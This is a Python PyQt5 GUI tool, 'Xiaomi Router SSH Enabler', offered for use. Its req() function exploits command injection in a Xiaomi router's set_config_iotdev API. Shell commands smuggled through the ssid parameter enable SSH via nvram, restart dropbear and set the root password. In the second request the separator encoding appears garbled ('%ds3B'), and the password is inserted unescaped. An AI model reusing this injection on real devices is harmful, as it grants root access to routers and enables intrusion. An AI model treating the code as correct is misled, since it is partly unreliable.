# -*- coding: utf-8 -*-
# @Time    : 2021/2/6 13:17
# @Author  : Johnson Sun (@poormonitor)
# @Email   : poormonitor@outlook.com
# @File    : main.py

import sys
import requests
from PyQt5 import QtCore, QtWidgets
from PyQt5.QtWidgets import QApplication, QDialog, QMessageBox


def req(ip, stok, passwd):
    result1 = requests.get(
        "http://" + ip + "/cgi-bin/luci/;stok=" + stok + "/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B")
    result2 = requests.get(
        "http://" + ip + "/cgi-bin/luci/;stok=" + stok + "/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%ds3B%20echo%20-e%20'" + passwd + "%5Cn" + passwd + "'%20%7C%20passwd%20root%3B")
    if result1.text == '{"code":0}' and result2.text == '{"code":0}':
        return True
    else:
        return False


class Ui_Dialog(object):
    def setupUi(self, Dialog):
        Dialog.setObjectName("Dialog")
        Dialog.resize(375, 235)
        self.pushButton = QtWidgets.QPushButton(Dialog)
        self.pushButton.setGeometry(QtCore.QRect(130, 180, 93, 28))
        self.pushButton.setObjectName("pushButton")
        self.label = QtWidgets.QLabel(Dialog)
        self.label.setGeometry(QtCore.QRect(80, 50, 21, 16))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(Dialog)
        self.label_2.setGeometry(QtCore.QRect(70, 90, 31, 16))
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(Dialog)
        self.label_3.setGeometry(QtCore.QRect(40, 130, 72, 15))
        self.label_3.setObjectName("label_3")
        self.lineEdit = QtWidgets.QLineEdit(Dialog)
        self.lineEdit.setGeometry(QtCore.QRect(120, 50, 121, 21))
        self.lineEdit.setObjectName("lineEdit")
        self.lineEdit_2 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_2.setGeometry(QtCore.QRect(120, 90, 191, 21))
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.lineEdit_3 = QtWidgets.QLineEdit(Dialog)
        self.lineEdit_3.setGeometry(QtCore.QRect(120, 130, 191, 21))
        self.lineEdit_3.setText("")
        self.lineEdit_3.setEchoMode(QtWidgets.QLineEdit.Password)
        self.lineEdit_3.setObjectName("lineEdit_3")

        self.retranslateUi(Dialog)
        self.pushButton.clicked.connect(Dialog.act)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "Xiaomi Router SSH Enabler"))
        self.pushButton.setText(_translate("Dialog", "OK"))
        self.label.setText(_translate("Dialog", "IP"))
        self.label_2.setText(_translate("Dialog", "stok"))
        self.label_3.setText(_translate("Dialog", "Password"))
        self.lineEdit.setText(_translate("Dialog", "192.168.31.1"))


class MainDialog(QDialog):
    def __init__(self, parent=None):
        super(QDialog, self).__init__(parent)
        self.ui = Ui_Dialog()
        self.ui.setupUi(self)

    def act(self):
        stok = self.ui.lineEdit_2.text()
        passwd = self.ui.lineEdit_3.text()
        ip = self.ui.lineEdit.text()
        result = req(ip, stok, passwd)
        if result:
            QMessageBox.information(self, 'success', 'success')
        else:
            QMessageBox.information(self, 'error', 'error')


if __name__ == '__main__':
    myapp = QApplication(sys.argv)
    myDlg = MainDialog()
    myDlg.show()
    sys.exit(myapp.exec_())
